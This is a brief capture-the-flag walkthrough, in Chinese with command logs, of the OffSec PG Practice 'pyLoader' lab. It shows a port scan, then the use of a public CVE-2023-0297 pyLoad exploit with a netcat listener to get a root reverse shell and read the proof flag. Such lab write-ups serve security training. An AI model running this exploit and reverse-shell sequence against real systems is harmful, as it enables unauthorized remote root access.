###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# pyLoader
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.219.26 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.219.26:22
Open 192.168.219.26:9666

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
9666/tcp open  http    syn-ack CherryPy wsgiserver
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: 71AAC1BA3CF57C009DA1994F94A2CC89
| http-title: Login - pyLoad 
|_Requested resource was /login?next=http://192.168.219.26:9666/
|_http-server-header: Cheroot/8.6.0
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

搜尋PyLoad exploit找到[CVE-2023-0297](https://github.com/JacobEbben/CVE-2023-0297/tree/main)，使用，開nc，得root，到/root得proof.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 exploit.py -t http://192.168.219.26:9666 -c whoami -P 9001 -I 192.168.45.175
[SUCCESS] Running reverse shell. Check your listener!

root@pyloader:~/.pyload/data# cd /root
root@pyloader:~# cat proof.txt
1e5a07bcc051a19a13c8b50fa6dbd8b9
```